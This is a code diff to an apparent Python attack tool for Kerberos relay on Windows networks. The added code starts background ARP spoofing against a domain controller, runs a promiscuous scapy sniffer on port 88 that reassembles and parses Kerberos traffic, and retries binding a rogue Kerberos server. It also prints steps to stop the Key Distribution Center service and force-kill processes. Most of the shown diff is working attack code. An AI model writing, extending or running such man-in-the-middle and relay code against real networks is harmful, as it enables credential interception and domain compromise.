-                    rich_print_error(f'[RELAY] Failed to start server on port {server_port}: {server_error}')
-                raise
+                raise bind_error
+                
+            # If we get here, server started successfully
+            break
             
-    except Exception as e:
-        rich_print_error(f'[RELAY] Failed to start server: {e}')
-        # Additional diagnostics
-        rich_print_info('[RELAY] Attempting to diagnose port conflicts...', 'yellow')
+        except Exception as e:
+            rich_print_error(f'[RELAY] Failed to start server (attempt {attempt}/{max_attempts}): {e}')
+            if attempt < max_attempts:
+                rich_print_info(f'[RELAY] Will retry in 10 seconds...', 'yellow')
+                time.sleep(10)
+                attempt += 1
+            else:
+                rich_print_error('[RELAY] All binding attempts failed!')
+                rich_print_error('[RELAY] Manual intervention required:')
+                rich_print_info('[RELAY]   1. Check services: services.msc', 'yellow')
+                rich_print_info('[RELAY]   2. Stop "Kerberos Key Distribution Center"', 'yellow')
+                rich_print_info('[RELAY]   3. Check processes: netstat -ano | findstr :88', 'yellow')
+                rich_print_info('[RELAY]   4. Kill conflicting processes: taskkill /F /PID <pid>', 'yellow')
+                rich_print_info('[RELAY]   5. Restart script as administrator', 'yellow')
+                raise e
+        # Provide helpful diagnostics
         try:
             result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
             lines = result.stdout.split('\n')
             port_88_lines = [line for line in lines if ':88 ' in line and 'LISTENING' in line]
             if port_88_lines:
-                rich_print_info('[RELAY] Current port 88 usage:', 'yellow')
-                for line in port_88_lines[:3]:
-                    rich_print_info(f'[RELAY] {line.strip()}', 'cyan')
+                rich_print_info('[RELAY] Processes currently using port 88:', 'yellow')
+                for line in port_88_lines[:2]:
+                    rich_print_info(f'[RELAY] {line.strip()}', 'white')
         except Exception:
             pass
-        
-        # Suggest solutions
-        rich_print_info('[RELAY] Possible solutions:', 'yellow')
-        rich_print_info('[RELAY] 1. Stop conflicting services (like Windows KDC)', 'cyan')
-        rich_print_info('[RELAY] 2. Use --port to specify an alternative port', 'cyan')
-        rich_print_info('[RELAY] 3. Use --disable-spoofing mode if you control traffic redirection externally', 'cyan')
-        rich_print_info('[RELAY] 4. Run the diagnostic utilities: python diagnose_port88.py', 'cyan')
-        
         raise
 
 # ============================================================================
@@ -1771,7 +1868,7 @@ def listen_mode():
         rich_print_info('[LISTEN] TCP sessions enable proper packet reassembly for Kerberos', 'yellow')
         rich_print_info('[LISTEN] Press Ctrl+C to stop packet capture...', 'cyan')
         
-        # CRITICAL: Import and use TCPSession for proper packet reassembly on Windows
+        # CRITICAL: Try to import TCPSession for proper packet reassembly on Windows
         try:
             from scapy.sessions import TCPSession
             tcp_session_available = True
@@ -1858,16 +1955,110 @@ def listen_mode():
 
 def relay_mode():
     global AllUsernames
+    
+    # RESET the stop flag to ensure clean start - this fixes early exit issue
+    stop_arp_spoofing_flag.clear()
+    rich_print_info('[RELAY] Reset stop flag - ensuring clean startup', 'cyan')
+    
     try:
+        # Start ARP spoofing in background (if enabled)
+        if not disable_spoofing:
+            thread = threading.Thread(target=relaymode_arp_spoof, args=(dc,))
+            thread.daemon = True
+            thread.start()
+            rich_print_info('[+] ARP spoofing started in background', 'green')
+        
+        # CRITICAL: Try to import TCPSession for proper packet reassembly on Windows
+        try:
+            from scapy.sessions import TCPSession
+            tcp_session_available = True
+            rich_print_success('[TCP SESSION] TCP session support available - enables packet reassembly')
+        except ImportError:
+            tcp_session_available = False
+            rich_print_warning('[TCP SESSION] TCP session support not available - using basic mode')
+        
         # Update display to show we're now relaying
         update_live_display()
+        
+        # Create a threading event to signal when to stop the sniffer
+        stop_sniffer = threading.Event()
+        
+        # Start packet sniffer in a separate thread
+        def run_sniffer():
+            rich_print_info('[RELAY] Starting parallel packet sniffer with TCP session support', 'green')
+            rich_print_info('[RELAY] This will capture and reassemble multi-segment Kerberos packets', 'yellow')
+            
+            try:
+                while not stop_sniffer.is_set():
+                    try:
+                        if tcp_session_available:
+                            # Use TCPSession for proper TCP reassembly (critical for Kerberos over TCP)
+                            sniff(
+                                filter="src port 88", 
+                                prn=parse_dc_response, 
+                                iface=iface, 
+                                store=False, 
+                                promisc=True, 
+                                session=TCPSession,  # CRITICAL: TCP packet reassembly
+                                count=50,  # Increased from 10 to reduce loop frequency
+                                timeout=10  # Increased from 2 to reduce CPU usage
+                            )
+                        else:
+                            # Fallback without TCP session
+                            sniff(
+                                filter="src port 88", 
+                                prn=parse_dc_response, 
+                                iface=iface, 
+                                store=False, 
+                                promisc=True, 
+                                count=50,  # Increased from 10
+                                timeout=10  # Increased from 2
+                            )
+                        
+                        # Add small sleep to prevent tight loop if sniff returns immediately
+                        if not stop_sniffer.is_set():
+                            time.sleep(0.1)
+                            
+                    except KeyboardInterrupt:
+                        break
+                    except Exception as sniff_e:
+                        if "timeout" not in str(sniff_e).lower():
+                            rich_print_warning(f'[RELAY] Sniff exception: {sniff_e}')
+                            if debug:
+                                import traceback
+                                rich_print_info(f'[RELAY DEBUG] Exception details: {traceback.format_exc()}', 'cyan')
+                        # Continue the loop regardless - don't let exceptions stop listening
+                        time.sleep(0.5)  # Brief pause on error
+            except Exception as e:
+                rich_print_error(f'[RELAY] Error in packet sniffer: {e}')
+        
+        # Start the sniffer thread
+        sniffer_thread = threading.Thread(target=run_sniffer)
+        sniffer_thread.daemon = True
+        sniffer_thread.start()
+        rich_print_success('[RELAY] Parallel packet sniffer started successfully!')
+        
+        # Run the Kerberos relay server in the main thread
         asyncio.run(kerberos_server())
+        
     except KeyboardInterrupt:
-        pass
-    finally :
+        rich_print_info('\n[RELAY] Relay mode stopped by user', 'yellow')
+        stop_arp_spoofing_flag.set()  # Ensure ARP spoofing stops
+        if 'stop_sniffer' in locals():
+            stop_sniffer.set()  # Signal sniffer thread to stop
+    except Exception as e:
+        rich_print_error(f'[RELAY] Error in relay mode: {e}')
+        if debug:
+            import traceback
+            rich_print_info(f'[RELAY DEBUG] Full traceback: {traceback.format_exc()}', 'cyan')
+    finally:
         # Stop live display before cleanup messages
         stop_live_display()
         console.print()  # Add newline
+        
+        # Stop sniffer if it's running
+        if 'stop_sniffer' in locals():
+            stop_sniffer.set()
         
         # Use centralized cleanup
         cleanup_all()
@@ -2316,6 +2507,10 @@ def main():
     try:
         if mode == 'relay' :
             rich_print_info('Starting relay mode execution...')
+            
+            # Setup enhanced Windows networking for relay mode
+            setup_windows_networking()
+            
             relay_mode()
         else :
             rich_print_info('Starting listen mode execution...')
